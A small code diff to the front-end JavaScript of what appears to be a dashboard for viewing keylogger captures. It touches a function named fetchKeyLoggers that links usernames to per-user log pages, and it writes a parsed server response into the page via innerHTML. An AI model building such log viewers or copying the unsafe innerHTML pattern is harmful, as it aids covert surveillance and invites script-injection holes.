@@ -4,7 +4,9 @@ $("#mySidenav").on('click','a',function(e){
   const xhttp = new XMLHttpRequest();
   console.log(xhttp.status);
   xhttp.onload = function() {
-    document.getElementById("content").innerHTML=this.responseText;
+    var res=JSON.parse(this.response);
+    //document.getElementsByClassName("content")[0].innerHTML=res;
+    document.getElementById("content").innerHTML=res.toString();
   }
   xhttp.open("GET",e.target.href);
   xhttp.send();
@@ -20,6 +22,7 @@ window.onload=function fetchKeyLoggers() {
       var node = document.createTextNode(array[i].username);
       user.appendChild(node);
       user.setAttribute('href',"/user/logs/"+array[i].username);
+      user.setAttribute('class',"w3-bar-item w3-button");
       element.appendChild(user);
       element.appendChild(document.createElement('br'));
     }
